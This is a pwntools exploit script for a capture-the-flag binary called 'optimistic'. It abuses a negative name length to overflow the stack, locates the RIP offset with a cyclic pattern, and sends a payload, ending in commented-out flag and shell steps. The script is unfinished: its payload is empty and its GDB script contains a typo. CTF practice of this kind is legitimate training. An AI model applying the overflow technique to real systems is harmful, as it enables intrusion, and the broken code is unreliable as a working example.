from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter(":", 'y')
    p.sendlineafter("Email:", '420')
    p.sendlineafter("Age:", '1337')
    p.sendlineafter("Length of name:", '-1')
    p.sendlineafter("Name:", payload)

    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of the crash
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4)) # x64
    info("located EIP/RIP offset at {a}".format(a=ip_offset))
    return ip_offset


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
breadk-rva 0x00001368
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './optimistic'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Offset to RIP, found manually with GDB
offset = find_ip(cyclic(500))

# Start program
io = start()

# Build payload
payload = flat(
    {offset: ""}
)

write('payload', payload)

# Send the payload
io.sendlineafter('>', payload)
io.recvuntil('Thank you!\n')

# # Get your flag!
# flag = io.recv()
# success(flag)

# Got shell?
# io.interactive()